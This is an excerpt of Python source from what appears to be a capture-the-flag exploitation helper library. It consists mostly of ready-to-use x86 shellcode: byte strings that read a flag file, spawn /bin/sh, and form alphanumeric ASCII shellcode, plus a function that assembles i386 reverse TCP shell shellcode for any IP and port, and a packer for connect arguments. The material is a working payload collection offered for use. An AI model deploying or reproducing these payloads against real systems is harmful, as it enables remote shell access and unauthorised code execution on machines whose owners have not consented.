...
class CkShellCode:
    class amd64:
        ...
        cat_flag = b"\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2f\x2e\x67\x6d\x60\x66\x01\x01\x48\x31\x04\x24\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"
        ascii_sh = b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
        scanf_sh = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"

        '''
        >>> 0x10166606d672e2f ^ 0x101010101010101
        113668128124718
        >>> p64(113668128124718)
        b'./flag\x00\x00'
        '''
...
class ShellcodeMall:
    ...
    class amd64:
        ...
        def ascii_shellcode(reg="rax"):
            ...
            if reg not in __m:
                ...
                sys.exit(1)
            return __m[
                reg] + b"h0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
    ...
    class i386:
        ...
        def reverse_tcp_shell(ip: str, port: int) -> bytes:
            ...
            for i in ip.strip().split("."):
                int_ip <<= 8
                int_ip |= int(i)
            return b"\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68" + int_ip.to_bytes(
                4, "big") + b"\x66\x68" + port.to_bytes(2,
                                                        "big") + b"\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    ...
    def generate_payload_for_connect(ip: str, port: int) -> bytes:
        ...
        return pack(2, word_size=16, endianness="little") + pack(port, word_size=16, endianness="big") + pack(int_ip,
                                                                                                              word_size=32,
                                                                                                              endianness="big") + pack(
            0, 64)
...
ck_opcode = CkShellCode()

amd64_opcode = ck_opcode.amd64()